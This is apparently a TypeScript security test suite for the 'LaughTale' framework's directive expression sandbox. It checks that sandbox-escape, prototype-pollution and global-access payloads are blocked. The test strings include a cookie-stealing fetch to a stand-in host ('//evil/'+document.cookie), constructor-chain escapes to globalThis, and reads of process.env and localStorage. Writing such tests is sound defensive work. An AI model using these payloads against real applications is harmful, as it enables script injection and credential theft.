/**
 * LaughTale: Directive Expression Sandbox Security Test Suite
 * Validates complete containment and ≥40 escape/RCE attack vectors against the AST expression interpreter.
 */

import './setup.ts';
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';

import { evaluateExpression, executeStatement } from '../src/directives/reactivity.ts';

describe('Directive Expression Sandbox Security Suite', () => {

    const scope = {
        count: 42,
        user: { name: 'Alice', role: 'admin' },
        items: ['first', 'second', 'third'],
        isActive: true,
        add: (a: number, b: number) => a + b,
        nested: { inner: { value: 100 } }
    };

    // ==========================================
    // 1. Critical Escape Payloads from Roadmap
    // ==========================================

    it('Payload 1: [].constructor.constructor("return globalThis")()', () => {
        const res = evaluateExpression('[].constructor.constructor("return globalThis")()', scope);
        assert.equal(res, undefined);
    });

    it('Payload 2: (function(){ return this })()', () => {
        const res = evaluateExpression('(function(){ return this })()', scope);
        assert.equal(res, undefined);
    });

    it('Payload 3: top.document.cookie', () => {
        const res = evaluateExpression('top.document.cookie', scope);
        assert.equal(res, undefined);
    });

    it('Payload 4: setTimeout("fetch(\'//evil/\'+document.cookie)")', () => {
        const res = evaluateExpression('setTimeout("fetch(\'//evil/\'+document.cookie)")', scope);
        assert.equal(res, undefined);
    });

    // ==========================================
    // 2. Global Object Access Attempts
    // ==========================================

    it('Escape vector: window', () => {
        assert.equal(evaluateExpression('window', scope), undefined);
        assert.equal(evaluateExpression('window.location', scope), undefined);
    });

    it('Escape vector: document', () => {
        assert.equal(evaluateExpression('document', scope), undefined);
        assert.equal(evaluateExpression('document.cookie', scope), undefined);
    });

    it('Escape vector: globalThis', () => {
        assert.equal(evaluateExpression('globalThis', scope), undefined);
        assert.equal(evaluateExpression('globalThis.process', scope), undefined);
    });

    it('Escape vector: self', () => {
        assert.equal(evaluateExpression('self', scope), undefined);
        assert.equal(evaluateExpression('self.location', scope), undefined);
    });

    it('Escape vector: parent', () => {
        assert.equal(evaluateExpression('parent', scope), undefined);
        assert.equal(evaluateExpression('parent.document', scope), undefined);
    });

    it('Escape vector: frames', () => {
        assert.equal(evaluateExpression('frames', scope), undefined);
        assert.equal(evaluateExpression('frames[0]', scope), undefined);
    });

    it('Escape vector: location', () => {
        assert.equal(evaluateExpression('location', scope), undefined);
        assert.equal(evaluateExpression('location.href', scope), undefined);
    });

    it('Escape vector: localStorage', () => {
        assert.equal(evaluateExpression('localStorage', scope), undefined);
        assert.equal(evaluateExpression('localStorage.getItem("token")', scope), undefined);
    });

    it('Escape vector: sessionStorage', () => {
        assert.equal(evaluateExpression('sessionStorage', scope), undefined);
        assert.equal(evaluateExpression('sessionStorage.getItem("token")', scope), undefined);
    });

    it('Escape vector: indexedDB', () => {
        assert.equal(evaluateExpression('indexedDB', scope), undefined);
    });

    it('Escape vector: cookie', () => {
        assert.equal(evaluateExpression('cookie', scope), undefined);
    });

    it('Escape vector: process & require', () => {
        assert.equal(evaluateExpression('process', scope), undefined);
        assert.equal(evaluateExpression('process.env', scope), undefined);
        assert.equal(evaluateExpression('require("fs")', scope), undefined);
    });

    it('Escape vector: fetch & XMLHttpRequest', () => {
        assert.equal(evaluateExpression('fetch("http://evil.com")', scope), undefined);
        assert.equal(evaluateExpression('XMLHttpRequest', scope), undefined);
    });

    it('Escape vector: timers & async dispatchers', () => {
        assert.equal(evaluateExpression('setInterval("alert(1)", 100)', scope), undefined);
        assert.equal(evaluateExpression('setImmediate', scope), undefined);
        assert.equal(evaluateExpression('clearTimeout', scope), undefined);
        assert.equal(evaluateExpression('clearInterval', scope), undefined);
        assert.equal(evaluateExpression('importScripts', scope), undefined);
    });

    // ==========================================
    // 3. Prototype Pollution & Constructor Escapes
    // ==========================================

    it('Prototype escape: ({}).__proto__', () => {
        assert.equal(evaluateExpression('({}).__proto__', scope), undefined);
    });

    it('Prototype escape: [].__proto__', () => {
        assert.equal(evaluateExpression('[].__proto__', scope), undefined);
    });

    it('Prototype escape: count.__proto__', () => {
        assert.equal(evaluateExpression('count.__proto__', scope), undefined);
    });

    it('Constructor escape: ({}).constructor', () => {
        assert.equal(evaluateExpression('({}).constructor', scope), undefined);
    });

    it('Constructor escape: [].constructor', () => {
        assert.equal(evaluateExpression('[].constructor', scope), undefined);
    });

    it('Constructor escape: "abc".constructor', () => {
        assert.equal(evaluateExpression('"abc".constructor', scope), undefined);
    });

    it('Constructor escape: (123).constructor', () => {
        assert.equal(evaluateExpression('(123).constructor', scope), undefined);
    });

    it('Constructor escape: true.constructor', () => {
        assert.equal(evaluateExpression('true.constructor', scope), undefined);
    });

    it('Prototype mutation attempt: ({}).__proto__.polluted = true', () => {
        assert.equal(evaluateExpression('({}).__proto__.polluted = true', scope), undefined);
        assert.equal((Object.prototype as any).polluted, undefined);
    });

    it('Prototype getter definition: __defineGetter__', () => {
        assert.equal(evaluateExpression('__defineGetter__("hacked", () => 1)', scope), undefined);
    });

    it('Prototype setter definition: __defineSetter__', () => {
        assert.equal(evaluateExpression('__defineSetter__("hacked", () => 1)', scope), undefined);
    });

    it('Prototype getter lookup: __lookupGetter__', () => {
        assert.equal(evaluateExpression('__lookupGetter__("toString")', scope), undefined);
    });

    it('Prototype setter lookup: __lookupSetter__', () => {
        assert.equal(evaluateExpression('__lookupSetter__("toString")', scope), undefined);
    });

    it('Direct eval invocation', () => {
        assert.equal(evaluateExpression('eval("1+1")', scope), undefined);
    });

    it('Direct Function constructor invocation', () => {
        assert.equal(evaluateExpression('Function("return 1")()', scope), undefined);
    });

    // ==========================================
    // 4. Forbidden Statements and Keywords
    // ==========================================

    it('Keyword rejection: new', () => {
        assert.equal(evaluateExpression('new Date()', scope), undefined);
        assert.equal(evaluateExpression('new Object()', scope), undefined);
    });

    it('Keyword rejection: import', () => {
        assert.equal(evaluateExpression('import("http://evil.com")', scope), undefined);
    });

    it('Keyword rejection: class', () => {
        assert.equal(evaluateExpression('class Evil {}', scope), undefined);
    });

    it('Keyword rejection: function & arrow', () => {
        assert.equal(evaluateExpression('function() { return 1; }', scope), undefined);
        assert.equal(evaluateExpression('() => 42', scope), undefined);
    });

    it('Keyword rejection: statements (var, let, const, return, with, debugger)', () => {
        assert.equal(evaluateExpression('var a = 1', scope), undefined);
        assert.equal(evaluateExpression('let b = 2', scope), undefined);
        assert.equal(evaluateExpression('const c = 3', scope), undefined);
        assert.equal(evaluateExpression('return 4', scope), undefined);
        assert.equal(evaluateExpression('with(state) {}', scope), undefined);
        assert.equal(evaluateExpression('debugger', scope), undefined);
    });

    it('Keyword rejection: control flow (while, for, do, try, catch, throw)', () => {
        assert.equal(evaluateExpression('while(true) {}', scope), undefined);
        assert.equal(evaluateExpression('for(let i=0; i<10; i++) {}', scope), undefined);
        assert.equal(evaluateExpression('try { throw 1; } catch(e) {}', scope), undefined);
        assert.equal(evaluateExpression('throw new Error("fail")', scope), undefined);
    });

    // ==========================================
    // 5. Valid Reactive Directive Expressions
    // ==========================================

    it('Valid: arithmetic and precedence', () => {
        assert.equal(evaluateExpression('count + 8', scope), 50);
        assert.equal(evaluateExpression('count * 2 + 6', scope), 90);
        assert.equal(evaluateExpression('(count + 8) / 2', scope), 25);
    });

    it('Valid: comparisons and conditionals', () => {
        assert.equal(evaluateExpression('count > 40 ? "high" : "low"', scope), 'high');
        assert.equal(evaluateExpression('count === 42 && isActive', scope), true);
        assert.equal(evaluateExpression('count !== 42 || !isActive', scope), false);
    });

    it('Valid: member and array access', () => {
        assert.equal(evaluateExpression('user.name', scope), 'Alice');
        assert.equal(evaluateExpression('items[1]', scope), 'second');
        assert.equal(evaluateExpression('nested.inner.value', scope), 100);
    });

    it('Valid: null-safe optional traversal', () => {
        assert.equal(evaluateExpression('user.missing.property', scope), undefined);
        assert.equal(evaluateExpression('user?.role', scope), 'admin');
        assert.equal(evaluateExpression('user?.nonexistent?.nested', scope), undefined);
    });

    it('Valid: method invocation in scope', () => {
        assert.equal(evaluateExpression('add(10, 20)', scope), 30);
    });

    it('Valid: extraContext ($event, loop variables)', () => {
        const extraContext = { $event: { target: { value: 'inputVal' } }, item: 'currItem', idx: 0 };
        assert.equal(evaluateExpression('$event.target.value', scope, extraContext), 'inputVal');
        assert.equal(evaluateExpression('item + "_" + idx', scope, extraContext), 'currItem_0');
    });

    it('Valid: statement execution and reactive state updates', () => {
        const localState = { count: 0, title: 'initial' };
        executeStatement('count += 5; title = "updated"', localState);
        assert.equal(localState.count, 5);
        assert.equal(localState.title, 'updated');

        executeStatement('count++', localState);
        assert.equal(localState.count, 6);
    });
});
